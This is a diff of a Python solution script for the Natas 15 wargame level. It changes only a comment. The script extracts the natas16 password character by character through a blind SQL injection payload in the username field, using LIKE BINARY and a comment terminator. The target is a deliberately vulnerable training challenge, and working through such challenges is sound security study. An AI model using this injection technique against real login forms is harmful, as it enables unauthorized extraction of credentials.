@@ -9,7 +9,7 @@ passwd=''
 for i in range(64):
     for chr in ch:
         atmp = {'username' : 'natas16" and password LIKE BINARY "' + passwd + chr + '%" #'}
-        r = requests.post(url,auth=HTTPBasicAuth('natas15',ps15),data = atmp)
+        r = requests.post(url,auth=HTTPBasicAuth('natas15',ps15),data = atmp) #data :將可能會使用到的參數都上傳
         #print(r.text)
         if "doesn't" not in r.text:
             passwd+=chr
